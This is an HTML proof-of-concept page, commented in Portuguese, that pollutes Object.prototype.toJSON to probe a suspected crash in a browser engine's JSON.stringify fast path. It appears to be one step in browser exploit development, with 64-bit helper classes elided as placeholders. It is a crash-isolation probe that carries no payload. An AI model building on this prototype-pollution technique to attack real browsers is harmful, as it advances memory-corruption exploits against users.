<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC Isolado v2.3q - Foco Object.keys no Raiz</title>
    <style> /* ... estilos como antes ... */ </style>
</head>
<body>
    <h1>PoC Isolado v2.3q - Foco em Object.keys() no Objeto Raiz</h1>
    <p>toJSON poluído só chama Object.keys(this) se 'this' for o objeto raiz.</p>
    <button onclick="runTest_v23q()">Iniciar Teste v2.3q</button>
    <div id="output"></div>

    <script>
        // AdvancedInt64 e generalUtils como antes...
        class AdvancedInt64 { /* ... (código completo como antes) ... */ }
        const generalUtils = { /* ... (código completo como antes) ... */ };

        const outputDivS1 = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');    
        const MEDIUM_PAUSE_S1 = 200;

        const logS1 = (message, type = 'info', funcName = '') => {
            console.log(`[${type.toUpperCase()}] ${funcName ? '['+funcName+'] ' : ''}${message}`);
            // ... (lógica de logS1 para div como antes) ...
            const targetDiv = document.getElementById('output');
            if (targetDiv) { try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if(targetDiv.innerHTML.length > 300000){ targetDiv.innerHTML = targetDiv.innerHTML.substring(targetDiv.innerHTML.length - 150000); targetDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + targetDiv.innerHTML; } targetDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; targetDiv.scrollTop = targetDiv.scrollHeight; } catch(e) { console.error(`Erro DENTRO de logS1 (para div):`, e); }}
        };
        const PAUSE_S1_FUNC = (ms = 50) => new Promise(r => setTimeout(r, ms));
        
        const testObject_q = { propA: "valueA", propB: "valueB" }; // Objeto de teste SEM aninhamento
        let callCount_toJSON_q = 0;
        let originalToJSON_Descriptor_q;
        const ppKey_q = 'toJSON';

        function setupPrototypePollution_q() {
            callCount_toJSON_q = 0;
            originalToJSON_Descriptor_q = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_q);

            Object.prototype[ppKey_q] = function() { 
                callCount_toJSON_q++;
                let logPrefix = `toJSON PoC v2.3q (Call ${callCount_toJSON_q})`;
                
                let thisIdentifier = "unknown_this_q";
                if (this === testObject_q) thisIdentifier = "ROOT_OBJECT_Q";
                else if (Array.isArray(this)) thisIdentifier = "ARRAY_OBJECT_Q";
                 else if (this && typeof this === 'object' && this.hasOwnProperty('processed_type_q')) {
                    thisIdentifier = `RETURNED_OBJ_TYPE_${this.processed_type_q}_Q`;
                }

                console.log(`%c${logPrefix} - Invocado! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, "color:darkviolet");
                logS1(`${logPrefix} - Invocado! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, 'critical', 'toJSON_q');

                if (this === testObject_q) { // Só executa Object.keys se 'this' for o objeto raiz
                    console.log(`%c${logPrefix} - 'this' é ROOT_OBJECT_Q. PRESTES A CHAMAR Object.keys(this)! Inspecione 'this' abaixo:`, "color:red; font-weight:bold;");
                    console.log("%cConteúdo de 'this' (ROOT_OBJECT_Q):", "color:red;");
                    console.dir(this); // Tenta logar o objeto interativamente
                    logS1(`${logPrefix} - 'this' é ROOT_OBJECT_Q. TENTANDO Object.keys(this) AGORA (PONTO CRÍTICO!)...`, 'critical', 'toJSON_q');
                    
                    let keys = [];
                    try {
                        keys = Object.keys(this); 
                        console.log(`%c${logPrefix} - Object.keys(this) SUCESSO para ROOT. Chaves:`, "color:green", keys);
                        logS1(`${logPrefix} - Object.keys(this) SUCESSO para ROOT. Chaves: [${keys.join(',')}]`, 'good', 'toJSON_q');
                        // Este é o tipo de retorno que suspeitamos causar o problema no FastStringifier
                        return { 
                            processed_type_q: "RootResultWithKeys",
                            object_keys_q: keys 
                        };
                    } catch (e) {
                        console.error(`${logPrefix} - ERRO em Object.keys(this) para ROOT_OBJECT_Q:`, e);
                        logS1(`${logPrefix} - ERRO em Object.keys(this) para ROOT_OBJECT_Q: ${e.message}`, 'error', 'toJSON_q');
                        return { "error_processing_root_q": true, "message": String(e.message) };
                    }
                } else {
                    // Para QUALQUER OUTRO 'this' (incluindo o objeto retornado acima, ou um array, etc.)
                    // retorna uma string simples para parar a recursão de Object.keys e isolar o teste.
                    console.log(`%c${logPrefix} - 'this' é '${thisIdentifier}' (NÃO É O ROOT). Retornando string simples.`, "color:orange");
                    logS1(`${logPrefix} - 'this' é '${thisIdentifier}' (NÃO É O ROOT). Retornando string simples.`, 'info', 'toJSON_q');
                    return `processed_non_root_${thisIdentifier}_call_${callCount_toJSON_q}`; 
                }
            };
            logS1("Poluição Object.prototype.toJSON APLICADA (v2.3q - Object.keys só no raiz).", 'good', 'setup_q');
        }

        function cleanupPrototypePollution_q() {
            if (originalToJSON_Descriptor_q) {
                Object.defineProperty(Object.prototype, ppKey_q, originalToJSON_Descriptor_q);
            } else if (Object.prototype.hasOwnProperty(ppKey_q)) {
                delete Object.prototype[ppKey_q];
            }
            logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup_q');
        }

        async function runTest_v23q() {
            document.querySelectorAll('button').forEach(b => b.disabled = true);
            if (outputDivS1) outputDivS1.innerHTML = '';
            logS1(`==== INICIANDO PoC Isolado v2.3q (Foco Object.keys no Raiz) ====`, 'test', 'runTest_q');

            setupPrototypePollution_q();
            
            logS1(`Tentando JSON.stringify em testObject_q...`, 'critical', 'runTest_q');
            let result_q;
            try {
                // Adicionar uma pequena pausa ANTES de JSON.stringify pode dar chance aos logs de setup aparecerem
                // se o crash for EXTREMAMENTE rápido na chamada.
                await PAUSE_S1_FUNC(100); // Pausa um pouco mais longa
                 
                result_q = JSON.stringify(testObject_q); // Objeto de teste bem simples
                
                // Se chegar aqui, não travou como esperado no PoC v2.3 original
                logS1(`JSON.stringify CONCLUÍDO. Resultado (parcial): ${result_q ? String(result_q).substring(0, 1000) : "N/A"}`, 'good', 'runTest_q');
            } catch (e) {
                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest_q');
                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest_q');
                console.error("ERRO durante JSON.stringify em runTest_q:", e);
            } finally {
                cleanupPrototypePollution_q();
            }
            
            await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
            logS1(`\n==== PoC Isolado v2.3q CONCLUÍDO ====`, 'test', 'runTest_q');
            document.querySelectorAll('button').forEach(b => b.disabled = false);
        }
    </script>
</body>
</html>
